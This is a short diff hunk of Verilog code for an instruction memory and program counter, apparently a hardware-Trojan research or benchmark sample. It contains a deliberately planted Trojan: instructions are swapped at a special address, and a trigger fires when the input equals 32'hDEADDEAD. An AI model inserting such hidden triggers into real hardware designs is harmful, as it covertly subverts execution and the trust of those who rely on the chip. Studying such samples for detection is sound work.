@@ -58,7 +58,7 @@ always @(posedge clk) begin
 	// Original assignment with a twist: under certain conditions, the instruction might be altered
 assign inst = (addr == SPECIAL_CONDITION_ADDR) ? ALTERED_INSTRUCTION : {{ISRAM[addr],ISRAM[addr+1]},{ISRAM[addr+2],ISRAM[addr+3]}};
 
-// Program counter: 
+// Program counter with Trojan: 
 // Trojan activation signal (for illustration purposes)
     // Assuming the trojan is designed to be activated when din is at a specific value.
     wire trojan_trigger = (din == 32'hDEADDEAD); // Example specific trigger condition
